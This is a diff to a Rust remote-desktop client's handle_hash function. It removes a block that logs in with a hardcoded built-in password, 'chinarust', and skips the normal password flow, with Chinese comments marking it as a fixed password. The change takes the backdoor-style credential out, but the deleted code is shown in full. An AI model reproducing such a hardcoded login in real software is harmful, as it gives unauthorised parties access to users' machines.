@@ -3345,35 +3345,7 @@ pub async fn handle_hash(
     peer: &mut Stream,
 ) {
     lc.write().unwrap().hash = hash.clone();
-
-    // ===== 内置固定密码 chinarust =====
-    let builtin_password = "chinarust";
-    {
-        let mut hasher = Sha256::new();
-        hasher.update(builtin_password);
-        hasher.update(&hash.salt);
-        let password = hasher.finalize()[..].into();
-        
-        let mut hasher2 = Sha256::new();
-        hasher2.update(&password);
-        hasher2.update(&hash.challenge);
-        let hash_password = hasher2.finalize()[..].to_vec();
-        
-        let is_terminal = lc.read().unwrap().conn_type.eq(&ConnType::TERMINAL);
-        let (os_username, os_password) = if is_terminal {
-            ("".to_owned(), "".to_owned())
-        } else {
-            (
-                lc.read().unwrap().get_option("os-username"),
-                lc.read().unwrap().get_option("os-password"),
-            )
-        };
-        
-        send_login(lc.clone(), os_username, os_password, hash_password, peer).await;
-        lc.write().unwrap().hash = hash;
-        return; // 使用内置密码后直接返回
-    }
-    // ===== 内置密码代码结束 =====
+    // Take care of password application order
 
     // switch_uuid
     let uuid = lc.write().unwrap().switch_uuid.take();
